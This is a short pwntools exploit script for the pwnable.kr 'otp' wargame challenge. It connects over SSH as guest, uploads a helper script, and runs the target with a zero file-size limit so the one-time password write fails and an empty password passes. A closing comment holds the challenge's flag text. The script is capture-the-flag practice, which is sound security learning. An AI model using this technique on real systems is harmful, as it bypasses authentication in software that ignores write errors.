from pwn import *

pwnfile = r"""
import subprocess
subprocess.Popen(["/home/otp/otp", ""])
"""

con = ssh("otp", "pwnable.kr", 2222, "guest")
con.shell("mkdir /tmp/leo2")
con.upload_data(pwnfile, "/tmp/leo2/pwnfile.py")
sh = con.shell("ulimit -f 0 && python -i /tmp/leo2/pwnfile.py")
print(sh.recv())

# Darn... I always forget to check the return value of fclose() :(
